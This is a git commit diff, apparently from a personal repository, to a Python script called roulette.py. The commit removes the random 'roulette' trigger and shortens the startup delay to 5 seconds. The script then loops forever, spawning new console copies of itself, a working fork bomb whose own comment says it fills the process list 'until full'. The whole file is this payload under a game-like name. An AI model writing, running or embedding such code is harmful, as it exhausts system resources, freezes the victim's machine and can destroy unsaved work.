3931115291bf0631f614f92215c8524db0a855d6
Austin Rieger <austin_rieger@yahoo.com>
2023-10-31 21:19:25 -0600

    Delay dropped to 5, random removed

--- roulette.py
+++ roulette.py
@@ -1,34 +1,22 @@
-import os
 import sys
 from time import sleep
-import random
 import subprocess
 
-#Number to guess before roulette is called 
-ROULETTE = 4
-
-
 #Delay execution of roulette by x seconds
-DELAY = 15
+DELAY = 5
+
+# rick_bomb
+# it's in the name.(Creates command prompts as 
+# subprocesses that take up spots in the process 
+# list/queue until full)
 def rick_bomb():
         while True:
             subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
-        
-def russian_roulette():
-    num = random.randint(0, 5)
-    print(num)
-    if ROULETTE == num:
-        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
-        rick_bomb()
-        return True
-    else: return False
-    
-    
+
 if __name__=="__main__":
     sleep(DELAY)
     while True:
-        sleep(.33)
-        if russian_roulette():
-            break
+        rick_bomb()
+        
 
 
